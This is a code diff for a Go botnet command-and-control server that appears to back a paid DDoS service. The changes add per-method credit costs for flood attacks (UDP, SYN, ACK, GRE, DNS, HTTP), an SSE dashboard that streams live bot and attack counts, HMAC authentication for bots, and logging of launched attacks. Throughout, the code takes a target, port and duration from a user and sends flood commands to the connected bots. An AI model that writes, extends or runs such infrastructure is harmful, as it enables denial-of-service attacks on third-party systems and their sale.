@@ -33,7 +33,6 @@ import (
 	"time"
 	"unicode"
 
-	"github.com/gorilla/websocket"
 	"golang.org/x/crypto/bcrypt"
 	"golang.org/x/time/rate"
 )
@@ -67,7 +66,23 @@ type Config struct {
 	CommandSigningKey   string        `json:"command_signing_key"`
 	BotCleanupInterval  time.Duration `json:"bot_cleanup_interval"`
 	HeartbeatInterval   time.Duration `json:"heartbeat_interval"`
+	ChallengeSalt       string        `json:"challenge_salt"`
 }
+
+const (
+	ColorStart   = "237"
+	ColorMid1    = "240"
+	ColorMid2    = "243"
+	ColorMid3    = "246"
+	ColorEnd     = "249"
+	ColorAccent1 = "251"
+	ColorAccent2 = "254"
+	ColorSuccess = "114"
+	ColorError   = "160"
+	ColorWarning = "166"
+	ColorInfo    = "117"
+	ColorSystem  = "183"
+)
 
 type User struct {
 	Username       string        `json:"username"`
@@ -80,9 +95,9 @@ type User struct {
 	LockedUntil    time.Time     `json:"lockedUntil"`
 	CreatedAt      time.Time     `json:"createdAt"`
 	LastActivity   time.Time     `json:"lastActivity"`
-	WalletAddress  string        `json:"walletAddress"` // Add this line
-	Credits        int           `json:"credits"`       // Also add Credits field which is referenced
-	Transactions   []Transaction `json:"transactions"`  // And Transactions if needed
+	WalletAddress  string        `json:"walletAddress"`
+	Credits        int           `json:"credits"`
+	Transactions   []Transaction `json:"transactions"`
 }
 
 type Transaction struct {
@@ -90,6 +105,7 @@ type Transaction struct {
 	Time        time.Time `json:"time"`
 	Amount      int       `json:"amount"`
 	Status      string    `json:"status"`
+	Target      string    `json:"target"`
 }
 
 type Bot struct {
@@ -135,13 +151,14 @@ type Metrics struct {
 }
 
 type DashboardData struct {
-	User           User
-	BotCount       int
-	OngoingAttacks []AttackInfo
-	Bots           []Bot
-	Users          []User
-	FlashMessage   string
-	BotsJSON       template.JS
+	User            User
+	BotCount        int
+	OngoingAttacks  []AttackInfo
+	Bots            []Bot
+	Users           []User
+	FlashMessage    string
+	BotsJSON        template.JS
+	ServerStartTime time.Time
 }
 
 type client struct {
@@ -190,6 +207,26 @@ type AggregatedStats struct {
 	UnhealthyBots int
 }
 
+type SSEBroker struct {
+	clients    map[chan string]struct{}
+	clientsMux sync.Mutex
+}
+
+type rateLimiter struct {
+	limiter      *rate.Limiter
+	lastSeen     time.Time
+	attacksToday int
+	lastReset    time.Time
+	dailyLimit   int
+}
+
+type session struct {
+	client     *client
+	lastActive time.Time
+	loginIP    string
+	expires    time.Time
+}
+
 var (
 	cfg                   *Config
 	bots                  []Bot
@@ -200,22 +237,15 @@ var (
 	serverStartTime       = time.Now()
 	signingKey            []byte
 	clients               []*client
-	upgrader              = websocket.Upgrader{
-		ReadBufferSize:  1024,
-		WriteBufferSize: 1024,
-		CheckOrigin: func(r *http.Request) bool {
-			return true
-		},
-	}
-	botConnLimiter   = rate.NewLimiter(rate.Every(5*time.Second), 1)
-	loginRateLimiter = rate.NewLimiter(rate.Every(5*time.Minute), 5)
-	ipLimiterMap     = make(map[string]*rateLimiter)
-	userLimiterMap   = make(map[string]*rateLimiter)
-	userSessions     = make(map[string]int)
-	connSemaphore    chan struct{}
-	blockedIPs       = make(map[string]time.Time)
-	botPerformance   = make(map[string]BotStats)
-	resetTokens      = struct {
+	botConnLimiter        = rate.NewLimiter(rate.Every(5*time.Second), 1)
+	loginRateLimiter      = rate.NewLimiter(rate.Every(5*time.Minute), 5)
+	ipLimiterMap          = make(map[string]*rateLimiter)
+	userLimiterMap        = make(map[string]*rateLimiter)
+	userSessions          = make(map[string]int)
+	connSemaphore         chan struct{}
+	blockedIPs            = make(map[string]time.Time)
+	botPerformance        = make(map[string]BotStats)
+	resetTokens           = struct {
 		sync.RWMutex
 		m map[string]resetToken
 	}{m: make(map[string]resetToken)}
@@ -228,6 +258,7 @@ var (
 		"169.254.0.0/16", "224.0.0.0/4", "::1/128", "fc00::/7", "fe80::/10",
 	}
 	templates *template.Template
+	sseBroker = NewSSEBroker()
 )
 
 const (
@@ -248,13 +279,11 @@ func main() {
 	var err error
 	cfg, err = loadConfig()
 	if err != nil {
-		fmt.Printf("Failed to load config: %v\n", err)
-		os.Exit(1)
+		log.Fatalf("Failed to load config: %v", err)
 	}
 
 	if err := validateConfig(); err != nil {
-		fmt.Printf("Invalid config: %v\n", err)
-		os.Exit(1)
+		log.Fatalf("Invalid config: %v", err)
 	}
 
 	signingKey = []byte(cfg.CommandSigningKey)
@@ -283,12 +312,92 @@ func main() {
 	go updateTitle()
 	go logSystemStats()
 	go attackManagerInstance.checkScheduledAttacks()
+	go broadcastMetrics()
 
 	if cfg.DDOSProtection {
 		go setupFirewallRules()
 	}
 
 	select {}
+}
+
+func NewSSEBroker() *SSEBroker {
+	return &SSEBroker{
+		clients: make(map[chan string]struct{}),
+	}
+}
+
+func (b *SSEBroker) AddClient(ch chan string) {
+	b.clientsMux.Lock()
+	defer b.clientsMux.Unlock()
+	b.clients[ch] = struct{}{}
+}
+
+func (b *SSEBroker) RemoveClient(ch chan string) {
+	b.clientsMux.Lock()
+	defer b.clientsMux.Unlock()
+	delete(b.clients, ch)
+	close(ch)
+}
+
+func (b *SSEBroker) Broadcast(msg string) {
+	b.clientsMux.Lock()
+	defer b.clientsMux.Unlock()
+	for ch := range b.clients {
+		select {
+		case ch <- msg:
+		default:
+			go b.RemoveClient(ch)
+		}
+	}
+}
+
+func broadcastMetrics() {
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		metrics := getCurrentMetrics()
+		data, _ := json.Marshal(metrics)
+		sseBroker.Broadcast(string(data))
+	}
+}
+
+func getCurrentMetrics() Metrics {
+	botCountLock.Lock()
+	currentBots := getBots()
+	activeBots := make([]Bot, 0)
+	for _, b := range currentBots {
+		if time.Since(b.LastHeartbeat) <= 2*cfg.HeartbeatInterval {
+			activeBots = append(activeBots, b)
+		}
+	}
+	botCountLock.Unlock()
+
+	attackManagerInstance.mutex.RLock()
+	attacks := make([]AttackInfo, 0, len(attackManagerInstance.attacks))
+	for _, attack := range attackManagerInstance.attacks {
+		remaining := time.Until(attack.Start.Add(attack.Duration))
+		if remaining <= 0 {
+			continue
+		}
+		attacks = append(attacks, AttackInfo{
+			Method:    attack.Method,
+			Target:    attack.Target,
+			Port:      attack.Port,
+			Duration:  fmt.Sprintf("%.0fs", attack.Duration.Seconds()),
+			Remaining: formatDuration(remaining),
+			ID:        attack.Method + "-" + attack.Target + "-" + attack.Port,
+		})
+	}
+	attackManagerInstance.mutex.RUnlock()
+
+	return Metrics{
+		BotCount:      len(activeBots),
+		ActiveAttacks: len(attacks),
+		Attacks:       attacks,
+		Bots:          activeBots,
+	}
 }
 
 func initTemplates() error {
@@ -332,6 +441,9 @@ func initTemplates() error {
 		"now":      func() time.Time { return time.Now() },
 		"sub":      func(a, b uint64) uint64 { return a - b },
 		"formatGB": func(bytes uint64) float64 { return float64(bytes) / 1073741824.0 },
+		"uptimeHours": func(startTime time.Time) float64 {
+			return time.Since(startTime).Hours()
+		},
 	}
 
 	var err error
@@ -354,7 +466,7 @@ func startWebServer() {
 	}
 
 	http.HandleFunc("/", handleRoot)
-	http.HandleFunc("/ws", requireAuth(handleWebSocket))
+	http.HandleFunc("/events", requireAuth(handleSSE))
 	http.HandleFunc("/login", handleLogin)
 	http.HandleFunc("/dashboard", requireAuth(handleDashboard))
 	http.HandleFunc("/admin-command", requireAuth(handleAdminCommand))
@@ -373,6 +485,33 @@ func startWebServer() {
 	http.HandleFunc("/api/generate-key", requireAuthAPI(handleAPIGenerateKey))
 
 	log.Fatal(server.ListenAndServeTLS(cfg.CertFile, cfg.KeyFile))
+}
+
+func handleSSE(w http.ResponseWriter, r *http.Request, user User) {
+	w.Header().Set("Content-Type", "text/event-stream")
+	w.Header().Set("Cache-Control", "no-cache")
+	w.Header().Set("Connection", "keep-alive")
+
+	flusher, ok := w.(http.Flusher)
+	if !ok {
+		http.Error(w, "SSE not supported", http.StatusInternalServerError)
+		return
+	}
+
+	ch := make(chan string)
+	sseBroker.AddClient(ch)
+	defer sseBroker.RemoveClient(ch)
+
+	ctx := r.Context()
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case msg := <-ch:
+			fmt.Fprintf(w, "data: %s\n\n", msg)
+			flusher.Flush()
+		}
+	}
 }
 
 func handleRoot(w http.ResponseWriter, r *http.Request) {
@@ -477,35 +616,43 @@ func handleAttack(w http.ResponseWriter, r *http.Request, user User) {
 	duration := r.FormValue("duration")
 
 	if !isValidMethod(method) {
-		http.Redirect(w, r, "/dashboard?flash=Invalid attack method", http.StatusSeeOther)
+		http.Redirect(w, r, "/dashboard?flash=Invalid+attack+method", http.StatusSeeOther)
 		return
 	}
 
 	if !isValidIP(target) {
-		http.Redirect(w, r, "/dashboard?flash=Invalid target IP/hostname", http.StatusSeeOther)
+		http.Redirect(w, r, "/dashboard?flash=Invalid+target+IP/hostname", http.StatusSeeOther)
 		return
 	}
 
 	if !isValidPort(port) {
-		http.Redirect(w, r, "/dashboard?flash=Invalid port number", http.StatusSeeOther)
+		http.Redirect(w, r, "/dashboard?flash=Invalid+port+number", http.StatusSeeOther)
 		return
 	}
 
 	dur, err := strconv.Atoi(duration)
 	if err != nil || dur <= 0 || dur > cfg.MaxAttackDuration {
-		http.Redirect(w, r, "/dashboard?flash=Invalid duration", http.StatusSeeOther)
+		http.Redirect(w, r, "/dashboard?flash=Invalid+duration", http.StatusSeeOther)
 		return
 	}
 
 	if len(attackManagerInstance.attacks) >= cfg.MaxQueuedAttacks {
-		http.Redirect(w, r, "/dashboard?flash=Maximum attack limit reached", http.StatusSeeOther)
+		http.Redirect(w, r, "/dashboard?flash=Maximum+attack+limit+reached", http.StatusSeeOther)
 		return
 	}
 
 	if method == "!dns" {
 		portInt, _ := strconv.Atoi(port)
 		if portInt != 53 {
-			http.Redirect(w, r, "/dashboard?flash=DNS attacks must target port 53", http.StatusSeeOther)
+			http.Redirect(w, r, "/dashboard?flash=DNS+attacks+must+target+port+53", http.StatusSeeOther)
+			return
+		}
+	}
+
+	if user.Credits >= 0 {
+		attackCost := calculateAttackCost(method, dur)
+		if user.Credits < attackCost {
+			http.Redirect(w, r, "/dashboard?flash=Not+enough+credits", http.StatusSeeOther)
 			return
 		}
 	}
@@ -521,19 +668,60 @@ func handleAttack(w http.ResponseWriter, r *http.Request, user User) {
 	}
 
 	attackManagerInstance.mutex.Lock()
+	defer attackManagerInstance.mutex.Unlock()
+
 	if len(attackManagerInstance.attacks) >= attackManagerInstance.getMaxAttacks() {
 		attackManagerInstance.attackQueue = append(attackManagerInstance.attackQueue, attack)
-		attackManagerInstance.mutex.Unlock()
-		http.Redirect(w, r, "/dashboard?flash=Attack queued", http.StatusSeeOther)
+		http.Redirect(w, r, "/dashboard?flash=Attack+queued", http.StatusSeeOther)
 		return
 	}
+
 	attackManagerInstance.attacks[nil] = attack
-	attackManagerInstance.mutex.Unlock()
+
+	if user.Credits >= 0 {
+		users := getUsers()
+		for i := range users {
+			if users[i].Username == user.Username {
+				users[i].Credits -= calculateAttackCost(method, dur)
+				users[i].Transactions = append(users[i].Transactions, Transaction{
+					Description: "Attack",
+					Target:      target,
+					Time:        time.Now(),
+					Amount:      dur,
+					Status:      method,
+				})
+				break
+			}
+		}
+		saveUsers(users)
+	}
 
 	command := fmt.Sprintf("%s %s %s %d", method, target, port, dur)
 	sendToBots(command, user.Username)
 
-	http.Redirect(w, r, "/dashboard?flash=Attack launched successfully", http.StatusSeeOther)
+	logAttack(method, target, port, duration, user.Username)
+
+	http.Redirect(w, r, "/dashboard?flash=Attack+launched+successfully", http.StatusSeeOther)
+}
+
+func calculateAttackCost(method string, duration int) int {
+	costMultipliers := map[string]float64{
+		"!udpflood": 1.0,
+		"!udpsmart": 1.2,
+		"!tcpflood": 1.5,
+		"!synflood": 1.3,
+		"!ackflood": 1.1,
+		"!greflood": 1.4,
+		"!dns":      2.0,
+		"!http":     2.5,
+	}
+
+	multiplier := costMultipliers[method]
+	if multiplier == 0 {
+		multiplier = 1.0
+	}
+
+	return int(float64(duration) * multiplier)
 }
 
 func handleStopAllAttacks(w http.ResponseWriter, r *http.Request, user User) {
@@ -640,78 +828,14 @@ func handleDeleteUserWeb(w http.ResponseWriter, r *http.Request, user User) {
 	http.Redirect(w, r, "/dashboard?flash=User deleted successfully", http.StatusSeeOther)
 }
 
-func handleWebSocket(w http.ResponseWriter, r *http.Request, user User) {
-	ws, err := upgrader.Upgrade(w, r, nil)
-	if err != nil {
-		return
-	}
-	defer ws.Close()
-
-	ws.SetReadDeadline(time.Now().Add(90 * time.Second))
-	ws.SetPongHandler(func(string) error { ws.SetReadDeadline(time.Now().Add(90 * time.Second)); return nil })
-
-	ticker := time.NewTicker(30 * time.Second)
-	defer ticker.Stop()
-
-	for {
-		select {
-		case <-ticker.C:
-			ws.SetWriteDeadline(time.Now().Add(30 * time.Second))
-			if err := ws.WriteMessage(websocket.PingMessage, nil); err != nil {
-				return
-			}
-		default:
-			botCountLock.Lock()
-			currentBots := getBots()
-			activeBots := make([]Bot, 0)
-			for _, b := range currentBots {
-				if time.Since(b.LastHeartbeat) <= 2*cfg.HeartbeatInterval {
-					activeBots = append(activeBots, b)
-				}
-			}
-			botCountLock.Unlock()
-
-			attackManagerInstance.mutex.RLock()
-			attacks := make([]AttackInfo, 0, len(attackManagerInstance.attacks))
-			for _, attack := range attackManagerInstance.attacks {
-				remaining := time.Until(attack.Start.Add(attack.Duration))
-				if remaining <= 0 {
-					continue
-				}
-				attacks = append(attacks, AttackInfo{
-					Method:    attack.Method,
-					Target:    attack.Target,
-					Port:      attack.Port,
-					Duration:  fmt.Sprintf("%.0fs", attack.Duration.Seconds()),
-					Remaining: formatDuration(remaining),
-					ID:        attack.Method + "-" + attack.Target + "-" + attack.Port,
-				})
-			}
-			attackManagerInstance.mutex.RUnlock()
-
-			metrics := Metrics{
-				BotCount:      len(activeBots),
-				ActiveAttacks: len(attacks),
-				Attacks:       attacks,
-				Bots:          activeBots,
-			}
-
-			ws.SetWriteDeadline(time.Now().Add(30 * time.Second))
-			if err := ws.WriteJSON(metrics); err != nil {
-				return
-			}
-			time.Sleep(1 * time.Second)
-		}
-	}
-}
-
 func handleDashboard(w http.ResponseWriter, r *http.Request, user User) {
 	data := DashboardData{
-		User:           user,
-		BotCount:       getBotCount(),
-		OngoingAttacks: getOngoingAttacks(),
-		Bots:           getBots(),
-		Users:          getUsers(),
+		User:            user,
+		BotCount:        getBotCount(),
+		OngoingAttacks:  getOngoingAttacks(),
+		Bots:            getBots(),
+		Users:           getUsers(),
+		ServerStartTime: serverStartTime,
 	}
 
 	botsJSON, _ := json.Marshal(data.Bots)
@@ -759,6 +883,28 @@ func handleAPIStats(w http.ResponseWriter, r *http.Request, user User) {
 	}
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(stats)
+}
+
+func logConnection(connType, remoteAddr string) {
+	logMutex.Lock()
+	defer logMutex.Unlock()
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	fmt.Printf("\033[36m[%s] [CONNECTION] %s connected from %s\033[0m\n", timestamp, connType, remoteAddr)
+}
+
+func logDisconnection(connType, remoteAddr string) {
+	logMutex.Lock()
+	defer logMutex.Unlock()
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	fmt.Printf("\033[33m[%s] [DISCONNECTION] %s disconnected from %s\033[0m\n", timestamp, connType, remoteAddr)
+}
+
+func logAttack(method, target, port, duration, user string) {
+	logMutex.Lock()
+	defer logMutex.Unlock()
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	fmt.Printf("\033[31m[%s] [ATTACK] %s launched %s attack on %s:%s for %s seconds\033[0m\n",
+		timestamp, user, method, target, port, duration)
 }
 
 func handleAPIGenerateKey(w http.ResponseWriter, r *http.Request, user User) {
@@ -817,7 +963,10 @@ func requireAuthAPI(handler func(http.ResponseWriter, *http.Request, User)) http
 
 func startBotServer() {
 	cert, _ := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
-	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
+	tlsConfig := &tls.Config{
+		Certificates: []tls.Certificate{cert},
+		MinVersion:   tls.VersionTLS12,
+	}
 	listener, _ := tls.Listen("tcp", fmt.Sprintf("%s:%s", cfg.BotServerIP, cfg.BotServerPort), tlsConfig)
 	defer listener.Close()
 
@@ -831,15 +980,18 @@ func startBotServer() {
 }
 
 func handleBotConnection(conn net.Conn) {
-	if !botConnLimiter.Allow() {
-		conn.Close()
-		return
-	}
+	remoteAddr := conn.RemoteAddr().String()
+	logConnection("BOT", remoteAddr)
 	defer func() {
+		logDisconnection("BOT", remoteAddr)
 		conn.Close()
 		decrementBotCount()
 		removeBot(conn)
 	}()
+
+	if !botConnLimiter.Allow() {
+		return
+	}
 
 	challenge, err := sendChallenge(conn)
 	if err != nil {
@@ -853,18 +1005,12 @@ func handleBotConnection(conn net.Conn) {
 
 	incrementBotCount()
 
-	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
+	ip, _, _ := net.SplitHostPort(remoteAddr)
 	newBot := Bot{
 		Conn:          conn,
 		IP:            ip,
 		Time:          time.Now(),
 		LastHeartbeat: time.Now(),
-	}
-
-	country, city, _, _, _, err := getGeoLocation(ip)
-	if err == nil {
-		newBot.Country = country
-		newBot.City = city
 	}
 
 	botCountLock.Lock()
@@ -893,6 +1039,30 @@ func handleBotConnection(conn net.Conn) {
 	}
 }
 
+func sendChallenge(conn net.Conn) (string, error) {
+	challenge := make([]byte, 32)
+	if _, err := rand.Read(challenge); err != nil {
+		return "", err
+	}
+	_, err := fmt.Fprintf(conn, "CHALLENGE:%s\n", base64.StdEncoding.EncodeToString(challenge))
+	return base64.StdEncoding.EncodeToString(challenge), err
+}
+
+func verifyResponse(conn net.Conn, challenge string) (bool, error) {
+	reader := bufio.NewReader(conn)
+	response, err := reader.ReadString('\n')
+	if err != nil {
+		return false, err
+	}
+
+	h := hmac.New(sha256.New, []byte(cfg.ChallengeSalt))
+	decodedChallenge, _ := base64.StdEncoding.DecodeString(challenge)
+	h.Write(decodedChallenge)
+	expected := base64.StdEncoding.EncodeToString(h.Sum(nil))
+
+	return strings.TrimSpace(response) == expected, nil
+}
+
 func startUserServer() {
 	tlsConfig := getTLSConfig()
 	if tlsConfig == nil {
@@ -915,15 +1085,14 @@ func startUserServer() {
 }
 
 func handleUserConnection(conn net.Conn) {
+	remoteAddr := conn.RemoteAddr().String()
+	logConnection("USER", remoteAddr)
 	defer func() {
+		logDisconnection("USER", remoteAddr)
 		conn.Close()
 		<-connSemaphore
 		removeClient(conn)
 	}()
-
-	conn.SetDeadline(time.Now().Add(30 * time.Second))
-	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
-	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
 
 	tlsConn, ok := conn.(*tls.Conn)
 	if !ok {
@@ -933,9 +1102,6 @@ func handleUserConnection(conn net.Conn) {
 	if err := tlsConn.Handshake(); err != nil {
 		return
 	}
-
-	remoteAddr := conn.RemoteAddr().String()
-	logAuditEvent("SYSTEM", "CONNECTION", fmt.Sprintf("User connected from %s", remoteAddr))
 
 	handleRequest(tlsConn)
 }
@@ -1224,8 +1390,8 @@ func initializeRootUser() {
 			Expire:        time.Now().AddDate(10, 0, 0),
 			Level:         "Owner",
 			CreatedAt:     time.Now(),
-			WalletAddress: "", // Initialize empty or generate one
-			Credits:       -1, // -1 could represent unlimited credits
+			WalletAddress: "",
+			Credits:       -1,
 			Transactions:  []Transaction{},
 		}
 		users = append(users, rootUser)
@@ -1277,50 +1443,6 @@ func getTLSConfig() *tls.Config {
 		CipherSuites:     []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
 	}
-}
-
-func getGeoLocation(ip string) (string, string, string, float64, float64, error) {
-	if ip == "127.0.0.1" || ip == "::1" || ip == "localhost" {
-		return "Local", "Local Network", "Internal", 0, 0, nil
-	}
-	host, _, _ := net.SplitHostPort(ip)
-	ip = host
-	resp, err := http.Get(fmt.Sprintf("http://www.geoplugin.net/json.gp?ip=%s", ip))
-	if err != nil {
-		return "", "", "", 0, 0, err
-	}
-	defer resp.Body.Close()
-	var data struct {
-		Country   string  `json:"geoplugin_countryName"`
-		City      string  `json:"geoplugin_city"`
-		Region    string  `json:"geoplugin_regionName"`
-		Latitude  float64 `json:"geoplugin_latitude,string"`
-		Longitude float64 `json:"geoplugin_longitude,string"`
-		Error     bool    `json:"error"`
-	}
-	json.NewDecoder(resp.Body).Decode(&data)
-	if data.Error {
-		return "", "", "", 0, 0, nil
-	}
-	return data.Country, data.City, data.Region, data.Latitude, data.Longitude, nil
-}
-
-func sendChallenge(conn net.Conn) (string, error) {
-	challenge := randomString(16)
-	_, err := fmt.Fprintf(conn, "CHALLENGE:%s\n", challenge)
-	return challenge, err
-}
-
-func verifyResponse(conn net.Conn, challenge string) (bool, error) {
-	reader := bufio.NewReader(conn)
-	response, err := reader.ReadString('\n')
-	if err != nil {
-		return false, err
-	}
-	h := sha256.New()
-	h.Write([]byte(challenge + "SALT"))
-	expected := fmt.Sprintf("%x", h.Sum(nil))
-	return strings.TrimSpace(response) == expected, nil
 }
 
 func updateBotInfo(conn net.Conn, arch, coresStr, ramStr string) {
@@ -1646,7 +1768,7 @@ func handleClientSession(conn net.Conn, c *client) {
 		case "queue":
 			displayQueuedAttacks(conn, c)
 		case "cancel":
-			handleCancelAttack(parts, c)
+			handleCancelAttack(conn, parts, c)
 		case "bots", "bot":
 			displayBotCount(conn)
 		case "cls", "clear":
@@ -1669,14 +1791,14 @@ func handleClientSession(conn net.Conn, c *client) {
 			}
 		case "adduser":
 			if c.user.GetLevel() <= 1 {
-				handleAddUser(parts)
+				handleAddUser(conn, parts)
 			}
 		case "deluser":
 			if c.user.GetLevel() <= 1 {
-				handleDeleteUser(parts)
+				handleDeleteUser(conn, parts)
 			}
 		case "resetpw":
-			handleResetPassword(c, parts)
+			handleResetPassword(conn, c, parts)
 		case "?":
 			displayQuickHelp(conn)
 		case "status":
@@ -1928,20 +2050,24 @@ func handleAttackCommand(conn net.Conn, parts []string, c *client) {
 func displayQueuedAttacks(conn net.Conn, c *client) {
 	attacks := attackManagerInstance.getUserQueuedAttacks(c.user.Username)
 	if len(attacks) == 0 {
+		animateText(conn, "No queued attacks found.\n\r", 15*time.Millisecond, ColorInfo)
 		return
 	}
 	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
-	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
+	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
+		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
-	title := "\033[38;5;240sm|\033[38;5;251sm    QUEUED ATTACKS    \033[0m\n\r"
+	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    QUEUED ATTACKS    \033[0m\n\r",
+		ColorMid1, ColorAccent1)
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
-	headers := fmt.Sprintf("\033[38;5;240sm| %-3s | %-9s | %-15s | %-5s | %-8s | %-10s |\033[0m\n\r",
-		"ID", "Method", "Target", "Port", "Duration", "Queued For")
+	headers := fmt.Sprintf("\033[38;5;%sm| %-3s | %-9s | %-15s | %-5s | %-8s | %-10s |\033[0m\n\r",
+		ColorMid1, "ID", "Method", "Target", "Port", "Duration", "Queued For")
 	conn.Write([]byte(headers))
 	conn.Write([]byte(border))
 	for idx, attack := range attacks {
-		row := fmt.Sprintf("\033[38;5;243sm| %-3d | %-9s | %-15s | %-5s | %-8ds | %-10s |\033[0m\n\r",
+		row := fmt.Sprintf("\033[38;5;%sm| %-3d | %-9s | %-15s | %-5s | %-8ds | %-10s |\033[0m\n\r",
+			ColorMid2,
 			idx+1,
 			attack.Method,
 			attack.Target,
@@ -1951,18 +2077,23 @@ func displayQueuedAttacks(conn net.Conn, c *client) {
 		conn.Write([]byte(row))
 	}
 	conn.Write([]byte(border))
+	animateText(conn, "Use 'cancel <ID>' to remove a queued attack", 15*time.Millisecond, ColorInfo)
 }
 
-func handleCancelAttack(parts []string, c *client) {
+func handleCancelAttack(conn net.Conn, parts []string, c *client) {
 	if len(parts) < 2 {
+		animateText(conn, "Usage: cancel <queue ID>", 15*time.Millisecond, ColorError)
 		return
 	}
 	index, _ := strconv.Atoi(parts[1])
 	if index < 1 {
+		animateText(conn, "Invalid queue ID", 15*time.Millisecond, ColorError)
 		return
 	}
 	if attackManagerInstance.cancelQueuedAttack(c.user.Username, index-1) {
+		animateText(conn, fmt.Sprintf("Cancelled queued attack #%d", index), 15*time.Millisecond, ColorSuccess)
 	} else {
+		animateText(conn, fmt.Sprintf("No queued attack found with ID %d", index), 15*time.Millisecond, ColorError)
 	}
 }
 
@@ -1985,60 +2116,47 @@ func animateText(conn net.Conn, text string, delay time.Duration, color string) 
 
 func displayAttackLaunch(conn net.Conn, method, ip, port, duration string) {
 	conn.Write([]byte("\033[2J\033[H"))
-	now := time.Now().Format("15:04:05")
-	animateText(conn, fmt.Sprintf("[%s] ATTACK LAUNCHED", now), 10*time.Millisecond, "45")
-	conn.Write([]byte("\r\n\r\n"))
-
-	details := []struct {
-		label string
-		value string
-		color string
-	}{
-		{"Method:", method, "51"},
-		{"Target:", fmt.Sprintf("%s:%s", ip, port), "118"},
-		{"Duration:", fmt.Sprintf("%s seconds", duration), "197"},
-		{"Bots:", fmt.Sprintf("%d", getBotCount()), "214"},
-		{"Status:", "SENT TO BOTS", "46"},
-	}
-
-	maxLabelLen := 0
-	for _, d := range details {
-		if len(d.label) > maxLabelLen {
-			maxLabelLen = len(d.label)
-		}
-	}
-
-	for _, detail := range details {
-		padding := strings.Repeat(" ", maxLabelLen-len(detail.label))
-		line := fmt.Sprintf("  %s%s %s", detail.label, padding, detail.value)
-		animateText(conn, line, 5*time.Millisecond, detail.color)
-	}
-
-	conn.Write([]byte("\r\n"))
-	animateText(conn, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", 5*time.Millisecond, "240")
-	conn.Write([]byte("\r\n\r\n"))
-	conn.Write([]byte("\033[2K\r"))
+	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
+		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
+	conn.Write([]byte(border))
+	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ATTACK LAUNCHED    \033[0m\n",
+		ColorMid1, ColorAccent1)
+	conn.Write([]byte(title))
+	conn.Write([]byte(border))
+	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Method: \033[38;5;%sm%s\033[0m\n\r",
+		ColorMid1, ColorAccent2, method)))
+	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Target: \033[38;5;%sm%s:%s\033[0m\n\r",
+		ColorMid1, ColorAccent2, ip, port)))
+	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Duration: \033[38;5;%sm%s seconds\033[0m\n\r",
+		ColorMid1, ColorAccent2, duration)))
+	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Bots: \033[38;5;%sm%d\033[0m\n\r",
+		ColorMid1, ColorAccent2, getBotCount())))
+	conn.Write([]byte(border))
 }
 
 func displayOngoingAttacks(conn net.Conn) {
 	attacks := attackManagerInstance.getAttacks()
 	if len(attacks) == 0 {
+		animateText(conn, "No ongoing attacks found.\n\r", 15*time.Millisecond, ColorInfo)
 		return
 	}
 	conn.Write([]byte("\033[2J\033[H"))
-	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
+	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
+		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
-	title := "\033[38;5;240sm|\033[38;5;251sm    ONGOING ATTACKS    \033[0m\n\r"
+	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ONGOING ATTACKS    \033[0m\n\r",
+		ColorMid1, ColorAccent1)
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
-	headers := fmt.Sprintf("\033[38;5;240sm| %-9s | %-10s | %-5s | %-8s | %-15s | %-15s |\033[0m\n\r",
-		"Method", "Target", "Port", "Duration", "Time Remaining", "User")
+	headers := fmt.Sprintf("\033[38;5;%sm| %-9s | %-10s | %-5s | %-8s | %-15s | %-15s |\033[0m\n\r",
+		ColorMid1, "Method", "Target", "Port", "Duration", "Time Remaining", "User")
 	conn.Write([]byte(headers))
 	conn.Write([]byte(border))
 	for _, attack := range attacks {
 		remaining := time.Until(attack.Start.Add(attack.Duration))
 		if remaining > 0 {
-			row := fmt.Sprintf("\033[38;5;243sm| %-9s | %-10s | %-5s | %-8ds | %-15s | %-15s |\033[0m\n\r",
+			row := fmt.Sprintf("\033[38;5;%sm| %-9s | %-10s | %-5s | %-8ds | %-15s | %-15s |\033[0m\n\r",
+				ColorMid2,
 				attack.Method,
 				attack.Target,
 				attack.Port,
@@ -2054,21 +2172,26 @@ func displayOngoingAttacks(conn net.Conn) {
 func displayBotCount(conn net.Conn) {
 	count := getBotCount()
 	conn.Write([]byte("\033[2J\033[H"))
